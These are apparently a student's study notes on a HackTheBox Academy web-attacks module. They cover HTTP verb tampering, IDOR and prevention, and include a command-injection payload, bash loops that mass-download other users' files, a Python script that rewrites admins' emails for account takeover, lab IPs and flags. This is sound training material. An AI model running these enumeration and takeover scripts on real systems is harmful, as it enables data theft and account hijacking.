#  HTB: Web Attacks Module Summary

Module Link: https://academy.hackthebox.com/app/module/134

## **Introduction to Web Attacks (h1)**

in this module, we will cover three other web attacks that can be found in any web application, which may lead to compromise. We will discuss how to detect, exploit, and prevent each of these three attacks.

- [HTTP Verb Tampering.](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering)
- [Insecure Direct Object References (IDOR).](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [XML External Entity (XXE) Injection_Processing).](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
    - For more info about XML DTD visit → [w3schools](https://www.w3schools.com/xml/xml_dtd_intro.asp)

## **HTTP Verb Tampering (h2)**

### **Intro to HTTP Verb Tampering**

**HTTP Verb Tampering:** To understand `HTTP Verb Tampering`, we must first learn about the different methods accepted by the HTTP protocol. HTTP has [9 different verbs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) that can be accepted as HTTP methods by web servers. Other than `GET` and `POST`, the following are some of the commonly used HTTP verbs:

| Verb | Description |
| --- | --- |
| `HEAD` | Identical to a GET request, but its response only contains the `headers`, without the response body |
| `PUT` | Writes the request payload to the specified location |
| `DELETE` | Deletes the resource at the specified location |
| `OPTIONS` | Shows different options accepted by a web server, like accepted HTTP verbs |
| `PATCH` | Apply partial modifications to the resource at the specified location |

if a web server is not securely configured to manage these methods, we can use them to gain control over the back-end server. However, what makes HTTP Verb Tampering attacks more common (and hence more critical), is that they are caused by a misconfiguration in either the back-end web server or the web application, either of which can cause the vulnerability.

---

1. **Insecure** **Configurations**

A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. For example, a system admin may use the following configuration to require authentication on a particular web page:

```xml
<Limit GET POST>
    Require valid-user
</Limit>
```

Thus,  an attacker may still use a different HTTP method (like `HEAD`) to bypass this authentication mechanism

---

1. **Insecure Coding**

This can occur when a web developer applies specific filters to mitigate particular vulnerabilities while not covering all HTTP methods with that filter. For example, if a web page was found to be vulnerable to a SQL Injection vulnerability, and the back-end developer mitigated the SQL Injection vulnerability by the following applying input sanitization filters:

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```

We can see that the sanitization filter is only being tested on the `GET`parameter. If the GET requests do not contain any bad characters, then the query would be executed. However, when the query is executed, the `$_REQUEST["code"]` parameters are being used, which may also contain `POST` parameters, `leading to an inconsistency in the use of HTTP Verbs`. In this case, an attacker may use a `POST` request to perform SQL injection, in which case the `GET` parameters would be empty (will not include any bad characters). The request would pass the security filter, which would make the function still vulnerable to SQL Injection.

---

### Bypass Basic Authentication

In this section, we will test for HTTP verb tempering caused by  `Insecure Web Server Configurations`

Example: we have a basic `File Manager` web application, in which we can add new files by typing their names and hitting `enter`:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h2_1.jpeg)

However, suppose we try to delete all files by clicking on the red `Reset`button. In that case, we see that this functionality seems to be restricted for authenticated users only, as we get the following `HTTP Basic Auth` prompt:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h2_2.jpeg)

As we do not have any credentials, we will get a `401 Unauthorized` page: So, let's see whether we can bypass this with an HTTP Verb Tampering attack. To do so, we need to identify which pages are restricted by this authentication. look at the URL that the button navigates to after clicking it, we see that it is at `/admin/reset.php`. 

- `/admin/` ? yes it require authentication
- `/admin/reset.php` ? yes it also require authentication

so the full  `/admin` directory is restricted. 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h2_3.png)

The `GET` and `POST` methods are restricted to use on these directories but when I manually modified the request method to `DELETE` it retuned with success

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h2_4.png)

and if we return to the main page, we will see that the files have been deleted

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h2_5.png)

I also tried `OPTIONS`, `PUT` and `UPDATE` and all worked, but `HEAD` didnt work

### **Bypassing Security Filters**

This section will detect and exploit **HTTP verb tampering vulnerability** caused by `Insecure Coding` .For example, if a security filter was being used to detect injection vulnerabilities and only checked for injections in `POST` parameters (e.g. `$_POST['parameter']`), it may be possible to bypass it by simply changing the request method to `GET`.

---

**Detect**: using the previous example to test for injection vulnerability in this request:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h2_6.png)

This message shows that the web application uses certain filters on the back-end to identify injection attempts and then blocks any malicious requests. **We will use HTTP Verb Tempering to change the HTTP method that was used to build the filter on to a different HTTP methods**

---

**Exploit**: right-click on the request and select `change the request method`  to change it from GET to POST automatically, then in the filename parameter, test for injection vulnerability:  

```bash
filename=test.txt;id
```

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h2_7.png)

and we get a **Command Injections** due to the `inconsistent use of HTTP methods`!. As we explained before, this vulnerability was caused **because the back-end code only apply filter mechanism on the GET HTTP method** and this can be bypassed by simply changing the HTTP method. 

- Check the back-end code in **Verb Tampering Prevention** section

### **Verb Tampering Prevention**

**Insecure Configuration:** HTTP Verb Tampering vulnerabilities can occur in most modern web servers, including `Apache`, `Tomcat`, and `ASP.NET`. The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP verbs/methods, which leaves the other 
remaining methods unprotected.

The following is an example of a vulnerable configuration for an Apache web server, which is located in the site configuration file (e.g.`000-default.conf`), or in a `.htaccess` web page configuration file:

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

Note that the authorization is being limited only to the `GET` method with `http-method`, which leaves the page accessible through other HTTP methods.

The following example shows the same vulnerability for a `Tomcat` web server configuration, which can be found in the `web.xml` file for a certain Java web application:

```xml
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>
```

Finally, the following is an example for an `ASP.NET` configuration found in the `web.config` file of a web application:

```xml
<system.web>
    <authorization>
        <allow verbs="GET" roles="admin">
            <deny verbs="GET" users="*">
        </deny>
        </allow>
    </authorization>
</system.web>
```

Once again, the `allow` and `deny` scope is limited to the `GET` method, which leaves the web application accessible through other HTTP methods.

**Protection:** 

- avoid restricting authorization to a particular HTTP method and always allow/deny all HTTP verbs and methods.
- If we want to specify a single method, we can use safe keywords, like `LimitExcept` in Apache, `http-method-omission`  in Tomcat, and `add`/`remove` in ASP.NET, which cover all verbs except the specified ones.
- Finally,  to avoid similar attacks, we should generally `consider disabling/denying all HEAD requests` unless specifically required by the web application.

---

I**nsecure Coding:** While identifying and patching insecure web server configurations is relatively easy, doing the same for insecure code is much more challenging. This is because to identify this vulnerability in the code, we need to find inconsistencies in the use of HTTP parameters across functions, as in some instances, this may lead to unprotected functionalities and filters.

Let's consider the following `PHP` code from our `File Manager` exercise:

```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_GET['filename'])) {
        system("touch " . $_REQUEST['filename']);
        header("Refresh:0; url=index.php");
    } else {
        echo "Malicious Request Denied!";
    }
}
```

If we were only considering Command Injection vulnerabilities, we would say that this is securely coded. The `preg_match`function properly looks for unwanted special characters and does not allow the input to go into the command if any special characters are found. **However, the fatal error made in this case is not due to Command Injections but due to the** `inconsistent use of HTTP methods`.

- The `preg_match` function filter unwanted character in the `GET` HTTP method from `$_GET['filename']`
- However, the `$_REQUEST` is a PHP **superglobal** **variable** that is used to collect form data regardless of the HTTP method (GET or POST) used to submit it and this create an inconsistencies between the `preg_match` and `$_REQUEST` . Thus, the POST request is bypassed since only the GET HTTP method is checked with `preg_match`

To avoid HTTP Verb Tampering vulnerabilities in our code, `we must be consistent with our use of HTTP methods`and ensure that the same method is always used for any specific 
functionality across the web application. It is always advised to `expand the scope of testing in security filters` by testing all request parameters. This can be done with the following functions and variables:

| Language | Function |
| --- | --- |
| PHP | `$_REQUEST['param']` |
| Java | `request.getParameter('param')` |
| C# | `Request['param']` |

Index.php code 

```php
<?php
echo "<div></div><ul class=\"list-unstyled\" id=\"file\">";
if (!file_exists("notes.txt")) {
    echo "HTB{4lw4y5_c0v3r_4ll_v3rb5}";
}

if ($handle = opendir('./')) {
    echo "<div><h3>Available Files:<h3></div>";
    while (false !== ($entry = readdir($handle))) {
        if (!in_array($entry, ['.', '..', 'admin', 'index.php', 'style.css'])) {
            echo "<ul><li><h4><a href='" . $entry . "'>" . $entry . "</a></h4></li></ul>";
        }
    }
    closedir($handle);
}

if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_GET['filename'])) {
        system("touch " . $_REQUEST['filename']);
        header("Refresh:0; url=index.php");
    } else {
        echo "Malicious Request Denied!";
    }
}
echo "</ul>";
?>
```

## **Insecure Direct Object References (IDOR)(h3)**

### Intro to IDOR

IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable.

For example, if users request access to a file they recently uploaded, they may get a link to it such as (`download.php?file_id=123`). So, as the link directly references the file with (`file_id=123`), what would happen if we tried to access another file (which may not belong to us) with (`download.php?file_id=124`)? If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request 
with its `file_id`. In many cases, we may find that the `id` is easily guessable, making it possible to retrieve many files or resources that we should not have access to based on our permissions.

There are many ways of implementing a solid access control system for 
web applications, like having a Role-Based Access Control (RBAC) system. The main takeaway is that `an IDOR vulnerability mainly exists due to the lack of an access control on the back-end`.
 If a user had direct references to objects in a web application that 
lacks access control, it would be possible for attackers to view or 
modify other users' data.

Many developers ignore building an access control system; hence, most web applications and mobile applications are left unprotected on the back-end. In such applications, all users may have arbitrary access to all other user's data on the back-end. The only thing stopping users from accessing other user's data would be the front-end implementation of the application, which is designed to only show the user's data. In such cases, manually manipulating HTTP requests may reveal that all users have full access to all data, leading to a successful attack.

All of this makes IDOR vulnerabilities among the most critical vulnerabilities for any web or mobile application, not only due to exposing direct object references but mainly due to a lack of a solid 
access control system. Even a basic access control system can be challenging to develop. A comprehensive access control system covering the entire web application without interfering with its functions might be an even more difficult task. This is why IDOR/Access Control 
vulnerabilities are found even in very large web applications, like [Facebook](https://infosecwriteups.com/disclose-private-attachments-in-facebook-messenger-infrastructure-15-000-ae13602aa486), [Instagram](https://infosecwriteups.com/add-description-to-instagram-posts-on-behalf-of-other-users-6500-7d55b4a24c5a), and [Twitter](https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3).

### **Identifying IDORs**

Insecure Direct Object Reference (**IDOR**) occurs when an application provides direct access to objects based on user-supplied input without sufficient access control. Here is a summary of how to identify and test for these vulnerabilities:

---

**1. Inspecting URL Parameters & APIs**

The most common way to spot IDOR is by looking for **object references** (identifiers for specific data) in your browser’s address bar or API calls.

- **What to look for:** Parameters like `?uid=1`, `?id=123`, or `?filename=invoice_001.pdf`.
- **How to test:** Manually increment the numbers (e.g., change `uid=1` to `uid=2`) or use **fuzzing tools** to automate thousands of requests. If you see data belonging to another user, you’ve found an IDOR.

**2. Analyzing AJAX Calls (Front-End Code)**

Sometimes identifiers aren't visible in the URL but are hidden in the website's JavaScript.

- **The Trap:** Developers might include "Admin-only" functions in the front-end code, assuming regular users won't see them.
- **How to test:** Review the source code for AJAX requests. You might find hidden endpoints like `change_password.php` that require a `uid` parameter. If the back-end doesn't verify that the `uid` matches your session, you can modify anyone's data.
    
    ```jsx
    function changeUserPassword() {
        $.ajax({
            url:"change_password.php",
            type: "post",
            dataType: "json",
            data: {uid: user.uid, password: user.password, is_admin: is_admin},
            success:function(result){
                //
            }
        });
    }
    ```
    

**3. Decoding Hashing and Encoding**

If a parameter looks like gibberish (e.g., `?file=ZmlsZV8x`), it doesn't mean it’s secure—it might just be encoded.

- **Encoding:** Use tools to check for **Base64** or other common formats. If you can decode it, change the value, and re-encode it, you can bypass the "hidden" reference.
- **Hashing:** If you see a hash (like MD5), check the JavaScript to see if the hash is generated on the client side. If the app hashes a predictable string like `file_1.pdf`, you can simply generate your own hash for `file_2.pdf` to access it.
    
    ```jsx
    $.ajax({
        url:"download.php",
        type: "post",
        dataType: "json",
        data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
        success:function(result){
            //
        }
    });
    ```
    

**4. Comparing User Roles**

Advanced testing involves using two different accounts (e.g., **User A** and **User B**) to see how the server treats them.

- **Horizontal Privilege Escalation:** Attempt to access **User A’**s private data using **User B’**s session by swapping the ID in the API request.
- **The Root Cause:** This happens when the server checks if a user is **logged in**, but fails to check if that user **owns** the specific data they are requesting.
    
    ```json
    {
      "attributes" : 
        {
          "type" : "salary",
          "url" : "/services/data/salaries/users/1"
        },
      "Id" : "1",
      "Name" : "User1"
    
    }
    ```
    

### Mass IDOR Enumeration

> Exploiting IDOR vulnerabilities is easy in some instances but can be very challenging in others. Once we identify a potential IDOR, we can start testing it with basic techniques to see whether it would expose any other data. As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques.
> 

Let's start discussing various techniques of exploiting IDOR vulnerabilities, from basic enumeration to mass data gathering, to user privilege escalation.

---

1. **Insecure Parameter:** 

Let's start with a basic example that showcases a typical IDOR vulnerability. The exercise below is an `Employee Manager` web application that hosts employee records:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_1.jpeg)

when we click on the documents, there is a POST request sent to the back-end server with this paramter `uid=1` 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_2.png)

and based on the provided privileges we have `uid=1` we only got to see these documents 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_3.png)

that contains these two files

```json
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

To test for IDOR, we will start by simply changing the `uid` parameter. If the web application uses this `uid` POST parameter as a direct reference to the employee records it should show, we may be able to view other employees' documents by simply changing this value. If the back-end of the web application `does` have a proper access control system, we will get some form of `Access Denied`. 

When we try changing the `uid` to `?uid=2`, we don't notice any difference in the page output, as we are still getting the same list of documents, and may assume that it still returns our own
 documents:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_4.png)

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_5.png)

However, the files are different from `uid=1`  which appear to be the documents belonging to the employee with `uid=2`:

```json
documents/Invoice_2_08_2020.pdf
documents/Report_2_12_2020.pdf
```

Also. I noticed this function on the front-end of the index.php page

```jsx
   function getDocuments(uid) {
      $.redirect("/documents.php", {
        uid: uid,
      }, "POST", "_self");
    }
```

---

1. **Mass Enumeration**

we did find a IDOR vulnerability, but it will be time-consuming to go through all employees’ files. So we will automate this process. 

First we need the front-end element of the file’s name of each employee. 

```html
<li class='pure-tree_link'><a href='/documents/Invoice_2_08_2020.pdf' target='_blank'>Invoice</a>
</li><li class='pure-tree_link'><a href='/documents/Report_2_12_2020.pdf' target='_blank'>Report</a>
```

grep these documents using grep 

```bash
curl -s "http://154.57.164.74:30276/documents.php" -X POST -d 'uid=2' |  grep -oP "\/documents.*?.pdf"
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

Now, automate the `uid` parameter and download all the employees’ files

```bash
#!/bin/bash

url="http://154.57.164.74:30276"

for i in {1..20}; do
        for link in $(curl -s "$url/documents.php" -X POST -d "uid=$i" | grep -oP "\/documents.*?.(pdf|txt)"); do
                wget -q $url/$link
        done
done

```

This script will look for pdf and txt files in the `documents.php` page of each employee and download them 

### **Bypassing Encoded References**

Some object reference encoded in hash or base64 making enumeration more difficult, but it may still be possible. 

Example: Same previous example, but this time we will test the `Contracts` functionality:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_6.jpeg)

If we click on the `Employment_contract.pdf` file, it starts downloading the file. The intercepted request in Burp looks as follows:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_7.png)

```bash
GET /download.php?contract=MQ%3D%3D
```

- URL decode → `MQ==`
- Base64 decode → `1`

```bash
contract_c4ca4238a0b923820dcc509a6f75849b.pdf
```

In this case, the web application is not sending the direct reference in cleartext but appears to be hashing it in an `md5` format. 

We can attempt to hash various values, like `uid`, `username`, `filename`, and many others, and see if any of their `md5`hashes match the above value. If we find a match, then we can replicate
 it for other users and collect their files. For example, let's try to compare the `md5` hash of our `uid`(`contract=MQ%3D%3D` → `contract=1`), and see if it matches the above hash:

```jsx
$ echo -n 1 | md5sum 
c4ca4238a0b923820dcc509a6f75849b  -
```

To confirm if both hashes match, try subtracting them

```jsx
python3 -c "num1=0xc4ca4238a0b923820dcc509a6f75849b;num2=0xc4ca4238a0b923820dcc509a6f75849b;diff=num1 - num2;print(diff)"
0
             
```

and the result is 0, so they do match. Thus, the file name is created like this

```jsx
contract_ + md5sum(uid) + .pdf
```

---

1. **Function Disclosure**

As most modern web applications are developed using JavaScript frameworks, like `Angular`, `React`, or `Vue.js`, many web developers may make the mistake of performing sensitive 
functions on the front-end, which would expose them to attackers. For example, if the above hash was being calculated on the front-end, we can study the function and then replicate what it's doing to calculate the same hash. Luckily for us, this is precisely the case in this web application.

If we look at the `contracts.php` front-end source page, we will see the function responsible for URL-encoding of the `uid` 

```jsx
   function downloadContract(uid) {
      window.location = `/download.php?contract=${encodeURIComponent(btoa(uid))}`;
    }
```

---

1. **Mass Enumeration**

To automate the process, first look at the request and the response: 

```bash
$ curl 'http://154.57.164.64:31319/download.php?contract=MQ%3D%3D' curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 154.57.164.64:31319' -H $'Accept-Language: en-US,en;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://154.57.164.64:31319/contracts.php' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    $'http://154.57.164.64:31319/download.php?contract=MQ%3D%3D'

HTTP/1.1 200 OK
Date: Fri, 06 Feb 2026 10:27:11 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Description: File Transfer
Cache-Control: no-cache, must-revalidate
Expires: 0
Content-Disposition: attachment; filename="contract_c4ca4238a0b923820dcc509a6f75849b.pdf"
Content-Length: 0
Pragma: public
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/pdf
```

So the employee's files are viewed by the `uid` in the `contract` parameter of the `download.php` page

```bash
$ echo -n 1 | base64 -w 0 | jq -sRr @uri
MQ%3D%3D
```

This is a bash script that will first encode the uid then send a GET request to the endpoint using curl with `-J`switch, which tells curl to use the `Content-Disposition` filename instead of the URL name and `-O` to save the file 

```bash
for i in {1..20};do 
	for uid in $(echo -n "$i" | base64 -w 0 | jq -sRr @uri);do
		$(curl -s -J -O  "http://154.57.164.64:31319/download.php?contract=$uid")
	done
done
```

### **IDOR in Insecure APIs**

While `IDOR Information Disclosure Vulnerabilities` allow us to read various types of resources, `IDOR Insecure Function Calls`enable us to call APIs or execute functions as another user. Such functions and APIs can be used to change another user's private information, reset another user's password, or even buy items using another user's payment information. In many cases, we may be obtaining certain information through an information disclosure IDOR vulnerability and then using this information with IDOR insecure function call vulnerabilities

---

1. **Identifying Insecure APIs**

Going back to our `Employee Manager` web application, we can start testing the `Edit Profile` page for IDOR vulnerabilities:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_8.jpeg)

When we click on the `Edit Profile` button, we are taken to a page to edit information of our user profile, namely `Full Name`, `Email`, and `About Me`, which is a common feature in many web applications:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_9.jpeg)

We can change any of the details in our profile and click `Update profile`,and we'll see that they get updated and persist through refreshes, which means they get updated in a database somewhere. Let's intercept the `Update` request in Burp and look at it:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_10.png)

We see that the page is sending a `PUT` request to the `/profile/api.php/profile/1` API endpoint. `PUT` requests are usually used in APIs to update item details, while `POST` is used to create new items, `DELETE` to delete items, and `GET` to retrieve item details. So, a `PUT` request for the `Update profile` function is expected. The interesting bit is the JSON parameters it is sending:

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

We see that the `PUT` request includes a few hidden parameters, like `uid`, `uuid`, and most interestingly `role`, which is set to `employee`. The web application also appears to be setting the user access privileges (e.g. `role`) on the client-side, in the form of our `Cookie: role=employee` cookie, which appears to reflect the `role`specified for our user. This is a  common security issue. The access control privileges are sent as part of the client's HTTP request, either as a cookie or as part of the JSON request, leaving it under the client's control, which could be manipulated to gain more privileges.

---

1. **Exploiting Insecure APIs**

We know that we can change the `full_name`, `email`, and `about` parameters, as these are the ones under our control in the HTML form in the `/profile` web page. So, let's try to manipulate the other parameters.

There are a few things we could try in this case:

1. Change our `uid` to another user's `uid`, such that we can take over their accounts
2. Change another user's details, which may allow us to perform several web attacks
3. Create new users with arbitrary details, or delete existing users
4. Change our role to a more privileged role (e.g. `admin`) to be able to perform more actions

Let's start by changing our `uid` to another user's `uid` (e.g. `"uid": 2`). However, any number we set other than our own `uid` gets us a response of `uid mismatch`:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_11.jpeg)

The web application appears to be comparing the request's `uid` to the API endpoint (`/1`).
 This means that a form of access control on the back-end prevents us from arbitrarily changing some JSON parameters, which might be necessary to prevent the web application from crashing or returning errors. Perhaps we can try changing another user's details. We'll change the API endpoint to `/profile/api.php/profile/2`, and change `"uid": 2` to avoid the previous `uid mismatch`:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_12.jpeg)

As we can see, this time, we get an error message saying `uuid mismatch`. The web application appears to be checking if the `uuid` value we are sending matches the user's `uuid`. Since we are sending our own `uuid`, our request is failing. This appears to be another form of access control to prevent users from changing another user's details.

Next, let's see if we can create a new user with a `POST` request, change the `uid` to a new `uid`, and send the request to the API endpoint of the new `uid`:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_13.jpeg)

We get an error message saying `Creating new employees is for admins only`. The same thing happens when we send a `Delete` request, as we get `Deleting employees is for admins only`. The web application might be checking our authorization through the `role=employee` cookie because this appears to be the only form of authorization in the HTTP request.

Finally, let's try to change our `role` to `admin`/`administrator` to gain higher privileges. Unfortunately, without knowing a valid `role` name, we get `Invalid role` in the HTTP response, and our `role` does not update:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_14.png)

### **Chaining IDOR Vulnerabilities**

Usually, a `GET` request to the API endpoint should return the details of the requested user, so we may try calling it to see if we can retrieve our user's details. We also notice that after the page 
loads, it fetches the user details with a `GET` request to the same API endpoint:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_15.jpeg)

As mentioned in the previous section, the only form of authorization in our HTTP requests is the `role=employee`cookie, as the HTTP request does not contain any other form of 
user-specific authorization, like a JWT token, for example. Even if a token did exist, unless it was being actively compared to the requested object details by a back-end access control system, we may still be able to retrieve other users' details.

---

**1. Information Disclosure**

I kept changing the uid till I found another role other than the employee role:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_16.png)

```json
{
"uid":"10",
"uuid":"bfd92386a1b48076792e68b596846499",
"role":"staff_admin",
"full_name":"admin",
"email":"admin@employees.htb",
"about":"Never gonna give you up, Never gonna let you down"
}
```

---

1. **Modifying Other Users' Details**

Now, using this information to update this user to change his role from `admin` to `employee` using his uid and uuid

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_17.png)

Send a GET request to confirm the changes 

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_18.png)

ln addition to allowing us to view potentially sensitive details, the ability to modify another user's details also enables us to perform several other attacks. One type of attack is `modifying a user's email address` and then requesting a password reset link, which will be sent to the email address we specified, thus allowing us to take control over their account. Another potential attack is `placing an XSS payload in the 'about' field`, which would get executed once the user visits their `Edit profile` page, enabling us to attack the user in different ways.

---

1. **Chaining Two IDOR Vulnerabilities**

Before information disclosure, we couldn't create new users, even though it was vulnerable to IDOR,  because we didn't know which access roles were applied. Now that we know. lets create a new user with admin privileges by changing the role to `staff_admin`

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_19.png)

Confirm the creation:

 ![ALT](/HTB/Web_Penetration_Tester/Web_Attacks/Images/h3_20.png)

The task: 

> With our new `role`, we may also perform mass assignments to change specific fields for all users, like placing XSS payloads in their profiles or changing their email to an email we specify. `Try to write a script that changes all users' email to an email you choose.`. You may do so by retrieving their `uuids` and then sending a `PUT` request for each with the new email.
> 

I created this script to update all admins’ accounts with a new email and extract the flag, you can change the script to modify all users’ data, not just the admins’ 

```python
import requests
import re

URL = 'http://<TARGE-TIP>:<Target-port>/profile/api.php/profile/'

def extract_user_data():
	found_user = []

	for uid in range (1,11):
		full_url = f'{URL}{uid}'
		try: 
			req = requests.get(full_url)
			if req.status_code == 200:
				data = req.json()
				# check the role value, and save only admin's data
				if 'employee' in data.get("role"):
					continue
				else: 
					dic = {"uid":data.get("uid"),"uuid":data.get("uuid"),"full_name":data.get("full_name")}
					found_user.append(dic)
				
			else:
				print("Connction error")
		except requests.exceptions.JSONDecodeError:
			print(f"ID {uid} retuned sucess but no JSON body found {req.text}")
	return found_user

def update_data():
	found_users = extract_user_data() # list of users uid and uuid [{'uid':1,'uuid':88..},{..}]
	header = {'Cookie': 'role=staff_admin'}
	hacker_email = 'flag@idor.htb'
  # proxies = {"http": "http://127.0.0.1:8080",}

	for users in found_users:
		uid = users['uid']
		uuid = users['uuid']
		full_name = users['full_name']
		print(f"Targeting UID: {uid} with UUID: {uuid}")

		try:
			data = {
			"uid":uid,
			"uuid":uuid,
			"role":"staff_admin",
			"full_name":full_name,
			"email":hacker_email
			}
			# request method is PUT! we are updating the data
			req = requests.put(f'{URL}{uid}',json=data, headers=header,timeout=5)

			if req.status_code==200:
				print(f"Email updated sucessfully!")
			else:
				print(f"Failed For ID {uid}, Status: {req.status_code}")
				print(f"Server says: {req.text}")
		except requests.exceptions.JSONDecodeError as e:
			print(e)

	
def main():
	# 1. extract and filter
	print("Extracting admin's users....")
	targets = extract_user_data()

	if not targets:
		print("No Targets Found")
		return

	# 2. update
	print(f"Attempting to update {len(targets)} user/s")
	update_data()

	# 3. confirm
	print("Confirming changes")
	for user in targets:
		uid = user['uid']

		data = requests.get(f'{URL}{uid}').json()
		print(f"ID: {uid}, Email: {data.get('email')}, Full_name: {data.get('full_name')}, role: {data.get('role')}, about: {data.get('about')} ")
	
	# extracting the flag from the profile page
	print("Extracting the flag: ")
	res = requests.get(url='http://<TARGE-TIP>:<Target-port>/profile/').text
	flag = re.findall(r'HTB\{.*?\}', res)
	if flag:
		print(f"Flag: {flag[0]}")
	

if __name__ == "__main__":
	main()
```

result:

```python
Extracting admin's users....
Attempting to update 1 user/s
Targeting UID: 10 with UUID: bfd92386a1b48076792e68b596846499
Email updated sucessfully!
Confirming changes
ID: 10, Email: flag@idor.htb, Full_name: admin, role: staff_admin, about: Never gonna give you up, Never gonna let you down 
Extracting the flag: 
Flag: HTB{READIRECT}
```

### IDOR Prevention

Preventing **Insecure Direct Object Reference (IDOR)** requires a two-pronged defense strategy: fixing the underlying access control logic and obscuring how objects are referenced.

**1. Object-Level Access Control**

The root cause of IDOR is a failure to verify if a user has the right to access a specific resource. To fix this, developers should implement a **Role-Based Access Control (RBAC)** system. **The following is a sample code of how a web application may compare user roles to objects to allow or deny access control:** 

```jsx
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

- **Centralized Logic:** Access control should be handled by a central system, not scattered across individual pages.
- **Server-Side Verification:** The back-end must verify the user’s identity and permissions for *every* request.
- **Avoid Client-Side Trust:** Never trust user-supplied data (like cookies or hidden fields) to define roles. Instead, use a secure **session token** to look up the user's permissions in the back-end database.

---

**2. Secure Object Referencing**

Even with good access control, using predictable IDs (like `?id=101`) makes it easy for attackers to guess other resource locations.

- **Use UUIDs/GUIDs:** Replace simple integers with long, random strings (e.g., `550e8400-e29b-41d4-a716-446655440000`). This prevents attackers from "counting" through your database.
- **Back-end Mapping:** Map these unique identifiers to the actual database records on the server side.
- **No Front-end Hashing:** Do not calculate hashes or IDs on the client side, as attackers can reverse-engineer the logic.

The following example PHP code shows us how this may work:

```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result);
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```

---

**Key Takeaway**

| Strategy | Purpose | Effect |
| --- | --- | --- |
| **RBAC** | **Authorization** | Ensures the user is *allowed* to see the data. |
| **UUIDs** | **Obfuscation** | Ensures the user cannot *guess* other data identifiers. |

> **Note:** Obscurity (using UUIDs) is not a replacement for security (Access Control). Even if an ID is hard to guess, an attacker who happens to find a valid UUID can still access the data if the access control system is broken.
> 

